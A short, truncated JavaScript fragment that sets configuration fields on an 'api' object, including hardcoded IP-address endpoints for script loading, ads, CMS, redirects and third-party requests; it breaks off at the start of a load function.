...
(function(win, headVar){
    ...
    api.Info = {};
    api.InfoJS = "";
    api._js = "61.160.200.252:7701";
    api._log = "";
    api._ads = "61.160.200.252:9988";
    api._cms = "61.160.200.252:9002";
	api._redirect = "61.160.200.252:7701";
    api._log_flag = "0";
	api._third_req = "http://61.160.200.252:9002/";
    if (isAsync) {
        api.load = function(){
